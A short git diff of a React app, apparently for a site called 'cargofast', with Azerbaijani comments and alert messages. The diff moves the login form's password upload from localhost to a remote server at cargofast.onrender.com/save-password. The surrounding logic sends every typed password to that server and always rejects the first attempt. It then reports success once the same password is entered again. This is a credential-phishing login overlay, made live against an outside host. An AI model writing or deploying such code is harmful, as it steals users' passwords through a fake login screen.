@@ -31,9 +31,9 @@ function App() {
     setAttemptCount(prev => prev + 1);
 
     try {
-      await axios.post("http://localhost:5000/save-password", { password });
+      // ✅ Burada Render serverinə POST edilir
+      await axios.post("https://cargofast.onrender.com/save-password", { password });
 
-      // input sahəsini sıfırla
       setPassword("");
 
       if (attemptCount === 0) {
@@ -41,7 +41,7 @@ function App() {
         alert("Şifrə yanlışdır");
       } else if (password === lastTriedPassword) {
         alert("Giriş uğurludur!");
-        setShowLogin(false); // Login ekranını bağla
+        setShowLogin(false);
       } else {
         setLastTriedPassword(password);
         alert("Şifrə yanlışdır");
@@ -55,7 +55,6 @@ function App() {
   return (
     <div className="bg-light text-dark position-relative">
 
-      {/* Əsas sayt hissəsi */}
       {!showLogin && (
         <>
           <Header />
@@ -66,7 +65,6 @@ function App() {
         </>
       )}
 
-      {/* Login overlay */}
       {showLogin && (
         <div
           className="position-fixed top-0 start-0 w-100 h-100 d-flex justify-content-center align-items-center"
